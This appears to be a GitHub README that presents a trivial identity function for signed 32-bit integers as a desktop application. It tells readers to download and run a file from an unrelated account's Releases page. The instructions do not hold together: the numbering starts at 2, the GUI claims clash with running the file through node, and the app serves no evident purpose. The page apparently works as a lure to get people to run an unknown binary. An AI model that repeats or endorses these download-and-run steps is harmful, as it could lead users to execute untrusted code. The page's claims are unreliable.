## 🚀 Getting Started
Welcome to the number-int32-base-identity application! This tool helps you evaluate the identity function for a signed 32-bit integer. You can use it to understand how integers work in JavaScript and explore their behavior. Follow these simple steps to get started.

## 📋 System Requirements
Before you start, ensure your computer meets the following requirements:

- Windows, macOS, or a popular Linux distribution.
- Node.js installed (v10 or later). You can download Node.js from [here](https://nodejs.org/).
- Basic knowledge of where to find files on your computer.

## 💾 Download & Install
To download and install the number-int32-base-identity application, visit the [Releases page](https://github.com/Netbeanscode/number-int32-base-identity/releases). Here are the steps:

1. Click the link to go to the Releases page.
2. Find the latest version labeled as "Latest Release."
3. Look for the file that matches your operating system.
4. Click the download link to get the application file.

## 🖥️ Running the Application

2. If you are using Windows, right-click the file and select "Run" or "Open."
3. If you are on macOS, simply double-click the downloaded file to open it.
4. For Linux, you may need to open a terminal, navigate to the folder where you downloaded the file, and type `node filename.js` (replace `filename.js` with the actual file name).

## 🧩 How It Works
The number-int32-base-identity application evaluates how the identity function behaves with signed 32-bit integers. Here’s a brief overview of the key features:

- **Identity Function**: It returns the integer as it is, providing a straightforward evaluation.
- **Integer Type**: The tool only works with signed 32-bit integers, which is the common integer format in many programming environments.
- **User-Friendly Interface**: The application does not require programming skills. Just enter your integer, and it will do the rest.

## 📝 Using the Application
Using the number-int32-base-identity application is easy. Here are the steps to input your data:

1. Open the application.
2. You will see a prompt to enter a signed 32-bit integer.
3. Type your integer in the provided field.
4. Click the "Evaluate" button.
5. The application will display the result instantly.

If you enter a value outside the signed 32-bit range (-2,147,483,648 to 2,147,483,647), the application will alert you with a clear message. 

## 📊 Example Inputs
Here are some example inputs to try:

- Enter `1` to evaluate.
- Enter `-2` for negative input.
- Enter `2147483647` for the maximum positive value.
- Enter `-2147483648` for the minimum negative value.
